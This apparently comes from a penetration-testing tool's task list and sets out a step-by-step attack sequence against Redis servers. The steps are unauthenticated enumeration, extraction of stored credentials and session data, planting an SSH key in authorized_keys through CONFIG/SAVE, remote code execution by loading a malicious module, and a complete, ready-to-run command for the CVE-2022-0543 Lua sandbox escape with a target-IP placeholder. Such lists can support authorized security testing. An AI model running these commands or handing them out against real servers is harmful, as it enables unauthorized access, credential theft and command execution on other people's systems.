tasks.title: Nmap Redis Info Script
tasks.description: Redis historically has no authentication by default, so a simple connect-and-info is often all you need.

tasks.title: Connect & Enumerate
tasks.description: Connect with redis-cli and pull server info, keys, and any stored credentials/session data.

tasks.title: Write Authorized_keys via RDB Save
tasks.description: If Redis is running as a user with a home directory (or writable web root), abuse its config/SAVE commands to write your public key into ~/.ssh/authorized_keys, then SSH in directly.

tasks.title: RCE via MODULE LOAD (RedisModules-ExecuteCommand)
tasks.description: If MODULE LOAD isn't disabled, host a malicious .so module and load it to gain a system.exec()-style command execution primitive.

tasks.title: CVE-2022-0543 (Debian/Ubuntu Lua Sandbox Escape)
tasks.description: Debian/Ubuntu-packaged Redis (not upstream) ships with a Lua library path that lets EVAL scripts escape the sandbox entirely and run arbitrary OS commands — no MODULE LOAD or SSH key write needed. Distro-specific packaging bug, not a Redis core issue, so check the OS first.
commands: redis-cli -h {target_ip} EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
